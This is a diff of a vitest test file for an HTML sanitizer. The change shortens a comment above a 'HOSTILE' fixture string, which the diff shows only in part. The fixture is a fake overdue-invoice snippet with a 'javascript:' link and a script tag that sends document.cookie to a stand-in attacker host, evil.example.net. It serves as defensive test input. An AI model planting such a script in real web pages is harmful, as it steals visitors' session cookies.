@@ -1,12 +1,7 @@
 import { describe, it, expect } from 'vitest';
 import { sanitizeHtml, ALLOWED_TAGS, IMAGE_REMOVED_TEXT } from './sanitize-html';
 
-/**
- * The hostile clip from docs/specs/quick-look-outliers-prototype.html: a script, an image
- * with an error handler, a frame, a stylesheet that hides the page, a fixed overlay and a
- * javascript: link.
- */
-const HOSTILE =
+const HOSTILE = // the hostile clip from docs/specs/quick-look-outliers-prototype.html
   '<p><b>Invoice #4471</b> is overdue. <a href="javascript:alert(1)">Pay now</a> or contact ' +
   '<a href="mailto:billing@example.com">billing@example.com</a>.</p>' +
   '<script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
